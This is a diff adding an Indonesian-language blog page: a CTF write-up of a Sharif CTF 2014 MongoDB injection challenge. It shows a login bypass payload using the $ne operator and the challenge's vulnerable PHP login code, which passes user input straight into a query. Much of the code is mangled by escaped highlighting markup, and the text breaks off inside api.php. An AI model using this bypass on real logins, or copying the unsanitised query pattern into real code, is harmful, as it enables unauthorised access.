@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html>
+<!--
+====================================================
+       _         _ _ _       _            ___ 
+      | |       | (_) |     | |          / __)
+  ____| | _   _ | |_| | ____| | _   ____| |__ 
+ / _  | || \ / || | | |/ _  | || \ / ___)  __)
+( ( | | |_) | (_| | | ( ( | | | | | |   | |   
+ \_||_|____/ \____|_|_|\_||_|_| |_|_|   |_|  
+ 
+====================================================
+@ABDILAHRF
+====================================================
+-->
+<head>
+<meta charset="utf-8">
+<title>MONGO DB INJECTION | SHARIF CTF | INDONESIAN BACKTRACK GATHERING &vert; @ABDILAHRF</title>
+<meta name="description" content="Coffe Make you like a hero">
+<meta name="keywords" content="SharifCTF">
+
+<!-- Twitter Cards -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://localhost:4000/images/logo.png">
+<meta name="twitter:title" content="Mongo Db Injection | Sharif CTF | Indonesian Backtrack Gathering">
+<meta name="twitter:description" content="Coffe Make you like a hero">
+<meta name="twitter:creator" content="@abdilahrf">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mongo Db Injection | Sharif CTF | Indonesian Backtrack Gathering">
+<meta property="og:description" content="Coffe Make you like a hero">
+<meta property="og:url" content="http://localhost:4000/2014/10/mongo-db-injection-sharif-ctf-indonesian-backtrack-gathering/">
+<meta property="og:site_name" content="@abdilahrf">
+<meta property="og:image" content="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460">
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/2014/10/mongo-db-injection-sharif-ctf-indonesian-backtrack-gathering/">
+<link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="@abdilahrf Feed">
+<link rel="author" href="https://plus.google.com/?rel=author">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+
+
+    <link href='http://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,600,300,800,700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/font-awesome.min.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/normalize.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/nprogress.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/foundation.min.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/style.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/post.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/code/monokai.css">
+
+
+
+
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="http://localhost:4000/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="http://localhost:4000/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/images/apple-touch-icon-144x144-precomposed.png">
+
+<style type="text/css">@media only screen and (min-width:43.75em){.notepad-post-content div>p:first-child:first-letter{float:left;font-size:4.688rem;line-height:4.375rem;padding-top:.25rem;padding-right:.5rem;padding-left:.188rem;font-family:serif}}</style>
+</head>
+<body class="post-template" itemscope itemtype="http://schema.org/WebPage">  
+
+        <main id="notepad-post-container-simple" class="notepad-post-container-simple" role="main">
+            <header class="notepad-post-header-simple">
+                <div class="notepad-post-menu-header-simple">
+
+                    <a class="notepad-blog-logo" href="http://localhost:4000">
+                        <img src="http://localhost:4000/images/logo.png" alt="Blog Logo" />
+                    </a>
+
+                <div class="notepad-blog-menu">      
+    <div class="notepad-mobile-menu show-for-small">
+        <a href="#"><i class="fa fa-bars"></i></a>
+    </div>
+    <ul class="notepad-menu">
+        <li class="notepad-mobile-close-btn show-for-small text-right">
+            <a href="#"><i class="fa fa-times"></i></a>
+        </li>
+
+            <li>
+                    <a href="http://localhost:4000/">Home</a>
+                 </li>
+
+            <li>
+                    <a href="http://localhost:4000/featured">Featured Posts</a>
+                 </li>
+
+            <li>
+                    <a href="http://localhost:4000/categories">Categories</a>
+                 </li>
+
+            <li>
+                    <a href="http://localhost:4000/about">About</a>
+                 </li>
+            
+           <li><a href="http://localhost:4000/feed.xml" title="Atom/RSS feed"><i class="icon-rss"></i> Feed</a></li>
+    </ul>
+
+</div>
+            </div>
+
+                <div class="notepad-post-title-simple row">
+                    <div class="small-12 columns">
+                        <div class="notepad-post-meta-simple">
+                            <h1>Mongo Db Injection | Sharif CTF | Indonesian Backtrack Gathering</h1>
+                            <p>by <strong>Abdillah Muhamad</strong> &#8212; on <a href="http://localhost:4000/tags/index.html#SharifCTF" data-toggle="tooltip" title="Posts tagged with SharifCTF" rel="tag">SharifCTF</a> <strong><!-- <time datetime="2014-10-21T14:46:21+07:00">21 Oct 2014</time> --></strong></p>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+        <article class="notepad-post-content post tag-simple">
+            <div><p>ctf.sharif.edu kompetisi ctf internasional yang gk sengaja ane temuin di google dan menemukan challange mongodb injection + writeupnya yang sangat menarik dalam soal itu seperti ini instruksinya</p>
+
+<blockquote>
+  <pre><code class="language-text" data-lang="text">login and find the flag
+http://ctf.sharif.edu:25489
+</code></pre>
+</blockquote>
+
+<p>tampilan websitenya seperti ini  :</p>
+
+<p><a href="http://abdilahrf.me/images/2014/10/sharif14_beginning.png"><img class="aligncenter size-full wp-image-263" src="http://abdilahrf.me/images/2014/10/sharif14_beginning.png" alt="sharif14_beginning" width="580" height="321" /></a></p>
+
+<p> </p>
+
+<p>ada form login dengan field username+password+captcha</p>
+
+<p>pertama yang saya lakukan coba untuk view page source untuk mencari clue” , dan tidak ada   . kemudian coba untuk login menggunakan bypass sqli menggunakan ‘ OR ‘ = 1=1 ,dsb</p>
+
+<p>favicon di website tersebut coba kita scan menggunakan exiftool</p>
+
+<blockquote>
+  <pre><code class="language-bash" data-lang="bash">&lt;span class="c"&gt;# exiftool favicon.png&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
+</code></pre>
+</blockquote>
+
+<p>File Name         : favicon.png
+Directory         : .
+File Size         : 2.6 kB
+File Modification : 2014:09:23 12:59:18+02:00
+File Permissions  : rw-r–r–
+File Type         : PNG
+MIME Type         : image/png</p>
+
+<p>&lt;span class=”o”&gt;[&lt;/span&gt;…&lt;span class=”o”&gt;]&lt;/span&gt;</p>
+
+<p>Thumb URI : file:///Users/alz/Developer/git/pictonic/assets/svgs/3e91140ac1bfb9903b91c1b0ca092167.svg</p>
+
+<p>&lt;span class=”o”&gt;[&lt;/span&gt;…&lt;span class=”o”&gt;]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</p>
+
+<p>Menarik file png yang jadi favicon itu ternyata hasil conver dari file .svg , coba kita search file svg nya di google</p>
+
+<!--more-->
+
+<p><a href="http://abdilahrf.me/images/2014/10/sharif14_google_svg.png"><img class="aligncenter size-full wp-image-264" src="http://abdilahrf.me/images/2014/10/sharif14_google_svg.png" alt="sharif14_google_svg" width="774" height="272" /></a></p>
+
+<p> </p>
+
+<p>dan 😀 kita mengetahui sekarang bahwa backend untuk database mereka bukan pakai MySQL/PgSQL tapi pakai MongoDB</p>
+
+<p>karena kita sudah tau menggunakan MongoDB coba cari cara untuk menyerang MongoDB seperti ini</p>
+
+<p><a href="https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/">idontplaydarts.com – “Mongodb is vulnerable to SQL injection in PHP at least</a></p>
+
+<p>Di website itu kita belajar bagaimana MongoDB + Php bekerja</p>
+
+<blockquote>
+  <pre><code class="language-php" data-lang="php">&lt;span class="x"&gt;$collection-&gt;find(array(&lt;/span&gt;
+&lt;span class="x"&gt;    "username" =&gt; $_GET['username'],&lt;/span&gt;
+&lt;span class="x"&gt;    "passwd" =&gt; $_GET['passwd']&lt;/span&gt;
+&lt;span class="x"&gt;));
+</code></pre>
+</blockquote>
+
+<p>&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</p>
+
+<p>Script di atas sama dengan</p>
+
+<blockquote>
+  <pre><code class="language-php" data-lang="php">&lt;span class="x"&gt;mysql_query("SELECT * FROM collection&lt;/span&gt;
+&lt;span class="x"&gt;    WHERE username=" . $_GET['username'] . ",&lt;/span&gt;
+&lt;span class="x"&gt;    AND passwd=" . $_GET['passwd'])&lt;/span&gt;</code></pre>
+</blockquote>
+
+<p>biasanya untuk bypass login form kita buat query selalu mengembalikan nilai true walaupun yang kita masukan username dan password salah seperti</p>
+
+<blockquote>
+  <pre><code class="language-php" data-lang="php">&lt;span class="x"&gt;$collection-&gt;find(array(&lt;/span&gt;
+&lt;span class="x"&gt;    "username" =&gt; "admin",&lt;/span&gt;
+&lt;span class="x"&gt;    "passwd" =&gt; array("$ne" =&gt; 1)&lt;/span&gt;
+&lt;span class="x"&gt;));&lt;/span&gt;</code></pre>
+</blockquote>
+
+<p>$ne adalah operator mongodb yang maksudnya != ( tidak sama dengan )</p>
+
+<p>Sama Dengan</p>
+
+<blockquote>
+  <pre><code class="language-sql" data-lang="sql">&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;collection&lt;/span&gt;
+&lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="ss"&gt;"admin"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;</code></pre>
+</blockquote>
+
+<p>Dari 2 script di atas kita ketahui bahwa jika passwd != 1 maka nilai yang di kembalikan query (true) atau benar</p>
+
+<p>karena password yang di input tidak benar . maka akan masuk ke dashboard admin</p>
+
+<p>gunakan tamper data untuk mengirimkan post data</p>
+
+<blockquote>
+  <pre><code class="language-php" data-lang="php">&lt;span class="x"&gt;username=admin&amp;password[$ne]=1&amp;captcha=AXBYCZ
+</code></pre>
+</blockquote>
+
+<p>&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</p>
+
+<p>sesuaikan captcha dengan yang benar</p>
+
+<p>selain dengan tamper data , juga bisa menggunakan inspect element atau firebug untuk bypass login</p>
+
+<p>setelah login akan muncul dashboard seperti ini</p>
+
+<p><a href="http://abdilahrf.me/images/2014/10/panel.png"><img class="aligncenter wp-image-265 size-large" src="http://abdilahrf.me/images/2014/10/panel-1024x467.png" alt="panel" width="1024" height="467" /></a></p>
+
+<p> </p>
+
+<p>di panel admin ini di sediakan beberapa source code dari file seperti : login.php , init.php , api.php , panel.php</p>
+
+<p>coba kita lihat ke login.php</p>
+
+<blockquote>
+  <pre><code>&lt;?php
+/**
+ * User: some one
+ * Date: 8/25/14
+ * Time: 11:03 AM
+ */
+session_start();
+$m = new MongoClient();
+$db = $m-&gt;ctf5;
+$users_col = $db-&gt;users;
+$username = $_POST['username'];
+$password = $_POST['password'];
+$q = array(
+    'username' =&gt; $username,
+    'password' =&gt; $password
+);
+
+include 'Captcha.php';
+$v = Captcha::validate($_POST['captcha']);
+if ($v) {
+    $_SESSION['time'] = intval(time() / 60);
+    $_SESSION['count'] = 25;
+}else{
+    die('invalid captcha');
+}
+
+$user = $users_col-&gt;findOne($q);
+if(is_null($user)){
+    #header("Location: login-failed.html");
+    die('invalid username or password');
+}else{
+    $_SESSION['id'] = $user['_id']-&gt;{'$id'};
+    header("Location: panel.php");
+    die();
+}
+</code></pre>
+</blockquote>
+
+<p>kalau di script login.php kita bisa liat array nya dipisah</p>
+
+<blockquote>
+  <p><code>$q = array(&lt;br /&gt;
+'username' =&gt; $username,&lt;br /&gt;
+'password' =&gt; $password&lt;br /&gt;
+);&lt;br /&gt;
+$user = $users_col-&gt;findOne($q);</code></p>
+</blockquote>
+
+<p>sama dengan</p>
+
+<blockquote>
+  <pre><code class="language-php" data-lang="php">&lt;span class="x"&gt;$collection-&gt;find(array(&lt;/span&gt;
+&lt;span class="x"&gt;    "username" =&gt; $_GET['username'],&lt;/span&gt;
+&lt;span class="x"&gt;    "passwd" =&gt; $_GET['passwd']&lt;/span&gt;
+&lt;span class="x"&gt;));
+&lt;/span&gt;</code></pre>
+</blockquote>
+
+<p>lanjut kita liat script init.php</p>
+
+<blockquote>
+  <pre><code class="language-php" data-lang="php">&lt;span class="cp"&gt;&lt;?php&lt;/span&gt;
+&lt;span class="sd"&gt;/** &lt;/span&gt;
+&lt;span class="sd"&gt; * User: some one&lt;/span&gt;
+&lt;span class="sd"&gt; * Date: 8/25/14&lt;/span&gt;
+&lt;span class="sd"&gt; * Time: 11:00 AM&lt;/span&gt;
+&lt;span class="sd"&gt; */&lt;/span&gt;
+</code></pre>
+</blockquote>
+
+<p>&lt;span class=”k”&gt;function&lt;/span&gt; &lt;span class=”nf”&gt;generateRandomString&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”nv”&gt;$length&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”mi”&gt;10&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+&lt;span class=”p”&gt;{&lt;/span&gt;
+    &lt;span class=”nv”&gt;$characters&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”s1”&gt;’0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ’&lt;/span&gt;&lt;span class=”p”&gt;;&lt;/span&gt;
+    &lt;span class=”nv”&gt;$randomString&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”s1”&gt;’‘&lt;/span&gt;&lt;span class=”p”&gt;;&lt;/span&gt;
+    &lt;span class=”k”&gt;for&lt;/span&gt; &lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”nv”&gt;$i&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”mi”&gt;0&lt;/span&gt;&lt;span class=”p”&gt;;&lt;/span&gt; &lt;span class=”nv”&gt;$i&lt;/span&gt; &lt;span class=”o”&gt;&lt;&lt;/span&gt; &lt;span class=”nv”&gt;$length&lt;/span&gt;&lt;span class=”p”&gt;;&lt;/span&gt; &lt;span class=”nv”&gt;$i&lt;/span&gt;&lt;span class=”o”&gt;++&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt; &lt;span class=”p”&gt;{&lt;/span&gt;
+        &lt;span class=”nv”&gt;$randomString&lt;/span&gt; &lt;span class=”o”&gt;.=&lt;/span&gt; &lt;span class=”nv”&gt;$characters&lt;/span&gt;&lt;span class=”p”&gt;[&lt;/span&gt;&lt;span class=”nb”&gt;rand&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”mi”&gt;0&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt; &lt;span class=”nb”&gt;strlen&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”nv”&gt;$characters&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt; &lt;span class=”o”&gt;-&lt;/span&gt; &lt;span class=”mi”&gt;1&lt;/span&gt;&lt;span class=”p”&gt;)];&lt;/span&gt;
+    &lt;span class=”p”&gt;}&lt;/span&gt;
+    &lt;span class=”k”&gt;return&lt;/span&gt; &lt;span class=”nv”&gt;$randomString&lt;/span&gt;&lt;span class=”p”&gt;;&lt;/span&gt;
+&lt;span class=”p”&gt;}&lt;/span&gt;</p>
+
+<p>&lt;span class=”nv”&gt;$m&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”k”&gt;new&lt;/span&gt; &lt;span class=”nx”&gt;MongoClient&lt;/span&gt;&lt;span class=”p”&gt;();&lt;/span&gt;
+&lt;span class=”nv”&gt;$db&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”nv”&gt;$m&lt;/span&gt;&lt;span class=”o”&gt;-&gt;&lt;/span&gt;&lt;span class=”na”&gt;ctf5&lt;/span&gt;&lt;span class=”p”&gt;;&lt;/span&gt;
+&lt;span class=”nv”&gt;$users_col&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”nv”&gt;$db&lt;/span&gt;&lt;span class=”o”&gt;-&gt;&lt;/span&gt;&lt;span class=”na”&gt;users&lt;/span&gt;&lt;span class=”p”&gt;;&lt;/span&gt;
+&lt;span class=”nv”&gt;$flag_col&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”nv”&gt;$db&lt;/span&gt;&lt;span class=”o”&gt;-&gt;&lt;/span&gt;&lt;span class=”na”&gt;flag&lt;/span&gt;&lt;span class=”p”&gt;;&lt;/span&gt;
+&lt;span class=”nv”&gt;$user&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”nv”&gt;$users_col&lt;/span&gt;&lt;span class=”o”&gt;-&gt;&lt;/span&gt;&lt;span class=”na”&gt;findOne&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”k”&gt;array&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”s1”&gt;’username’&lt;/span&gt; &lt;span class=”o”&gt;=&gt;&lt;/span&gt; &lt;span class=”s1”&gt;’admin’&lt;/span&gt;&lt;span class=”p”&gt;));&lt;/span&gt;
+&lt;span class=”nv”&gt;$flag&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”nv”&gt;$flag_col&lt;/span&gt;&lt;span class=”o”&gt;-&gt;&lt;/span&gt;&lt;span class=”na”&gt;findOne&lt;/span&gt;&lt;span class=”p”&gt;();&lt;/span&gt;</p>
+
+<p>&lt;span class=”c1”&gt;// old codes&lt;/span&gt;
+&lt;span class=”c1”&gt;//$staffs = array(‘gholi’,’bobak’,’bijan’,’arash’);&lt;/span&gt;
+&lt;span class=”c1”&gt;//&lt;/span&gt;
+&lt;span class=”c1”&gt;//foreach($staffs as $staff){&lt;/span&gt;
+&lt;span class=”c1”&gt;//    $users_col-&gt;insert(array(&lt;/span&gt;
+&lt;span class=”c1”&gt;//        ‘username’ =&gt; $staff,&lt;/span&gt;
+&lt;span class=”c1”&gt;//        ‘role’=&gt;‘staff’,&lt;/span&gt;
+&lt;span class=”c1”&gt;//        ‘password’ =&gt; generateRandomString(20),&lt;/span&gt;
+&lt;span class=”c1”&gt;//    ));&lt;/span&gt;
+&lt;span class=”c1”&gt;//}&lt;/span&gt;</p>
+
+<p>&lt;span class=”c1”&gt;//$visitors = array(‘noone’,’bob’,’john’,’alice’);&lt;/span&gt;
+&lt;span class=”c1”&gt;//&lt;/span&gt;
+&lt;span class=”c1”&gt;//foreach($visitors as $visitor){&lt;/span&gt;
+&lt;span class=”c1”&gt;//    $users_col-&gt;insert(array(&lt;/span&gt;
+&lt;span class=”c1”&gt;//        ‘username’ =&gt; $visitor,&lt;/span&gt;
+&lt;span class=”c1”&gt;//        ‘role’=&gt;‘visitor’,&lt;/span&gt;
+&lt;span class=”c1”&gt;//        ‘password’ =&gt; generateRandomString(10),&lt;/span&gt;
+&lt;span class=”c1”&gt;//    ));&lt;/span&gt;
+&lt;span class=”c1”&gt;//}&lt;/span&gt;</p>
+
+<p>&lt;span class=”k”&gt;if&lt;/span&gt; &lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”nb”&gt;is_null&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”nv”&gt;$user&lt;/span&gt;&lt;span class=”p”&gt;))&lt;/span&gt; &lt;span class=”p”&gt;{&lt;/span&gt;
+    &lt;span class=”nv”&gt;$users_col&lt;/span&gt;&lt;span class=”o”&gt;-&gt;&lt;/span&gt;&lt;span class=”na”&gt;insert&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”k”&gt;array&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;
+        &lt;span class=”s1”&gt;’username’&lt;/span&gt; &lt;span class=”o”&gt;=&gt;&lt;/span&gt; &lt;span class=”s1”&gt;’admin’&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt;
+        &lt;span class=”s1”&gt;’role’&lt;/span&gt;&lt;span class=”o”&gt;=&gt;&lt;/span&gt;&lt;span class=”s1”&gt;’admin’&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt;
+        &lt;span class=”s1”&gt;’password’&lt;/span&gt; &lt;span class=”o”&gt;=&gt;&lt;/span&gt; &lt;span class=”nx”&gt;generateRandomString&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”mi”&gt;30&lt;/span&gt;&lt;span class=”p”&gt;),&lt;/span&gt;
+    &lt;span class=”p”&gt;));&lt;/span&gt;
+&lt;span class=”p”&gt;}&lt;/span&gt;
+&lt;span class=”k”&gt;if&lt;/span&gt; &lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”nb”&gt;is_null&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”nv”&gt;$flag&lt;/span&gt;&lt;span class=”p”&gt;))&lt;/span&gt; &lt;span class=”p”&gt;{&lt;/span&gt;
+    &lt;span class=”nv”&gt;$flag_col&lt;/span&gt;&lt;span class=”o”&gt;-&gt;&lt;/span&gt;&lt;span class=”na”&gt;insert&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”k”&gt;array&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;
+        &lt;span class=”s1”&gt;’flag’&lt;/span&gt; &lt;span class=”o”&gt;=&gt;&lt;/span&gt; &lt;span class=”nx”&gt;generateRandomString&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”mi”&gt;30&lt;/span&gt;&lt;span class=”p”&gt;),&lt;/span&gt;
+    &lt;span class=”p”&gt;));&lt;/span&gt;
+&lt;span class=”p”&gt;}&lt;/span&gt;
+&lt;span class=”cp”&gt;?&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</p>
+
+<p>penjelasannya di situ ada function random string untuk generate password,id,flag dan ada query insert flag sama insert admin dan init.php ini sepertinya yang akan diload pada setiap file karena koneksi mongodb di buka di script ini</p>
+
+<p>trus coba kita liat script selanjutnya api.php</p>
+
+<blockquote>
+  <pre><code class="language-php" data-lang="php">&lt;span class="cp"&gt;&lt;?php&lt;/span&gt;
+&lt;span class="sd"&gt;/**&lt;/span&gt;
+&lt;span class="sd"&gt; * User: some one&lt;/span&gt;
+&lt;span class="sd"&gt; * Date: 8/25/14&lt;/span&gt;
+&lt;span class="sd"&gt; * Time: 11:25 AM&lt;/span&gt;
+&lt;span class="sd"&gt; */&lt;/span&gt;
+&lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;is_null&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'id'&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"Location: index.html"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="nv"&gt;$ajax&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'HTTP_X_REQUESTED_WITH'&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="nb"&gt;strtolower&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'HTTP_X_REQUESTED_WITH'&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s1"&gt;'xmlhttprequest'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$ajax&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nv"&gt;$ajax&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="nv"&gt;$T&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="nv"&gt;$N&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="nv"&gt;$t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;intval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="nv"&gt;$T&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'time'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&lt;&lt;/span&gt; &lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'time'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;intval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="nv"&gt;$T&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'count'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$N&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'count'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&lt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
